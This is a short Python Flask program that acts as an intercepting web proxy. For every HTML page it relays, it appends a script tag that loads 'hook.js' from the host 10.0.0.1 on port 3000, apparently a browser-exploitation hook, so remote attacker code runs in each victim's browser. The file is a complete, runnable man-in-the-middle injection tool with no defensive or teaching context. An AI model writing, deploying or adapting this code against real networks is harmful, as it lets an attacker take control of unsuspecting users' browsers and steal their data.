import requests
from flask import Flask, request


app = Flask(__name__)

@app.route("/")
@app.route("/<path:path>")
def proxy(**kwargs):
    custom_header = {'User-Agent': request.headers.get('user-agent'),}
    original_page = requests.get(request.url, headers=custom_header)
    mime = original_page.headers.get('content-type')
    if 'text' in mime or 'json' in mime:
        if 'html' in mime:
            return original_page.text+'<script src="http://10.0.0.1:3000/hook.js"></script>'
        else: return original_page.text
    else:
        return original_page.content

if __name__ == "__main__":
    app.run(port=80, host="0.0.0.0")
